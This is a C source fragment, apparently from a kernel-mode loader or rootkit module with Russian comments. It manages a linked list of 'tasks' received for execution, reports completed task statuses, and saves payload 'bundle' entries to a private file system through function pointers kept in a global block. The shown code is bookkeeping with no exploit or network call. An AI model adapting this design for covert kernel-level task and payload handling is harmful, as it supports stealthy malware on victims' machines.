void tasks_add_task(ptask_t pTask)
{
    USE_GLOBAL_BLOCK

    if (pGlobalBlock->pTasksBlock->pTaskHead == NULL) {
        pGlobalBlock->pTasksBlock->pTaskHead = pTask;
    }
    else {
        ptask_t pTemp;
        pTemp = pGlobalBlock->pTasksBlock->pTaskHead;
        for ( ; pTemp->pNext != NULL; pTemp = pTemp->pNext);
        pTemp->pNext = pTask;
    }

    pGlobalBlock->pTasksBlock->fntasks_filter(pTask);
}

void tasks_remove_all()
{
    ptask_t pTask;
    USE_GLOBAL_BLOCK

    for (pTask = pGlobalBlock->pTasksBlock->pTaskHead; pTask != NULL; ) {
        pTask = pGlobalBlock->pTasksBlock->fntasks_destroy(pTask);
    }

    pGlobalBlock->pTasksBlock->pTaskHead = NULL;
}

uint32_t tasks_get_completed_task_count()
{
    ptask_t pTask;
    uint32_t count = 0;
    pmod_tasks_block_t pTasksBlock;
    USE_GLOBAL_BLOCK

    pTasksBlock = pGlobalBlock->pTasksBlock;

    for (pTask = pTasksBlock->pTaskHead; pTask != NULL; pTask = pTask->pNext) {
        if (pTask->status > TS_Obtained) {
            ++count;
        }
    }

    return count;
}

ptask_t tasks_get_next_obtained(ptask_t pTask)
{
    USE_GLOBAL_BLOCK

    if (pTask == NULL) {
        pTask = pGlobalBlock->pTasksBlock->pTaskHead;
    }
    else {
        pTask = pTask->pNext;
    }

    for ( ; pTask != NULL; pTask = pTask->pNext) {
        if (pTask->status == TS_Obtained) {
            return pTask;
        }
    }

    return NULL;
}

void tasks_fill_with_completed(void** pVector, uint32_t* pSize)
{
    ptask_t pTask;    
    pmod_tasks_block_t pTasksBlock;
    USE_GLOBAL_BLOCK

    pTasksBlock = pGlobalBlock->pTasksBlock;

    for (pTask = pTasksBlock->pTaskHead; pTask != NULL; pTask = pTask->pNext) {
        if (pTask->status > TS_Obtained) {
            if (pVector != NULL && *pVector != NULL) {
                pGlobalBlock->pCommonBlock->fnmemcpy((uint8_t*)(*pVector) + *pSize, &pTask->id, sizeof(pTask->id));
                pGlobalBlock->pCommonBlock->fnmemcpy((uint8_t*)(*pVector) + *pSize + sizeof(pTask->id), &pTask->groupId, sizeof(pTask->groupId));
                pGlobalBlock->pCommonBlock->fnmemcpy((uint8_t*)(*pVector) + *pSize + sizeof(pTask->id) + sizeof(pTask->groupId), &pTask->status, 1);
            }
            *pSize += sizeof(pTask->id) + sizeof(pTask->groupId) + 1;
        }
    }
}

int tasks_load_bundle_entries(pbundle_info_entry_t* pBundlesEntries, uint32_t* pCount)
{
    int err;
    uint32_t readed;
    uint8_t* buffer = NULL;
    pzfs_file_t pFile;
    USE_GLOBAL_BLOCK

    err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, pGlobalBlock->pTasksBlock->biPath, ZFS_MODE_READ, 0);
    if (err == ERR_OK) {
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &buffer, pFile->filesize, NonPagedPool);

        err = pGlobalBlock->pFsBlock->fnzfs_read(pFile, buffer, pFile->filesize, &readed);
        if (err != ERR_OK || readed != pFile->filesize) {
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(buffer, LOADER_TAG);
        }
        else {
            *pBundlesEntries = (pbundle_info_entry_t)buffer;
            *pCount = readed / sizeof(bundle_info_entry_t);
        }

        pGlobalBlock->pFsBlock->fnzfs_close(pFile);
    }

    return err;
}

int tasks_save_bundle_entries(pbundle_info_entry_t pBundlesItems, uint32_t count)
{
    int err;
    uint32_t written;
    pzfs_file_t pFile;
    USE_GLOBAL_BLOCK

    err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, pGlobalBlock->pTasksBlock->biPath, ZFS_MODE_WRITE | ZFS_MODE_CREATE, 0);
    if (err == ERR_OK) {
        err = pGlobalBlock->pFsBlock->fnzfs_write(pFile, (uint8_t*)pBundlesItems, count * sizeof(bundle_info_entry_t), &written);
        pGlobalBlock->pFsBlock->fnzfs_close(pFile);
    }

    return err;
}

int tasks_save_bundle_entry(pbundle_info_entry_t pBundleEntry)
{
    int err;
    uint8_t* buffer = NULL;
    uint32_t i, count = 0;
    bool_t needNewMemory = TRUE;
    uint8_t* newBuffer;
    uint32_t newSize;
    USE_GLOBAL_BLOCK

    // Считываем имеющиеся элементы.
    pGlobalBlock->pTasksBlock->fntasks_load_bundle_entries((pbundle_info_entry_t*)&buffer, &count);
    newSize = count * sizeof(bundle_info_entry_t);

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &newBuffer, newSize + sizeof(bundle_info_entry_t), NonPagedPool);

    if (count > 0) {
        pbundle_info_entry_t pTempEntry = (pbundle_info_entry_t)buffer;
        // Пробегаемся по всему списку в поисках совпадения по имени.
        for (i = 0; i < count; ++i, ++pTempEntry) {
            if (pGlobalBlock->pCommonBlock->fnstrcmp(pBundleEntry->name, pTempEntry->name) == 0) {
                // Заменяем содержимое бандла
                __movsb((uint8_t*)pTempEntry, (uint8_t*)pBundleEntry, sizeof(bundle_info_entry_t));
                needNewMemory = FALSE;
                break;
            }
        }

        __movsb(newBuffer, buffer, count * sizeof(bundle_info_entry_t));
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(buffer, LOADER_TAG);
    }

    if (needNewMemory) {
        __movsb(newBuffer + newSize, (uint8_t*)pBundleEntry, sizeof(bundle_info_entry_t));
        newSize += sizeof(bundle_info_entry_t);
        ++count;
    }

    err = pGlobalBlock->pTasksBlock->fntasks_save_bundle_entries((pbundle_info_entry_t)newBuffer, count);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(newBuffer, LOADER_TAG);

    return err;
}

void tasks_shutdown_routine()
{
    USE_GLOBAL_BLOCK

    pGlobalBlock->pTasksBlock->fntasks_remove_all();

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pTasksBlock, LOADER_TAG);
}
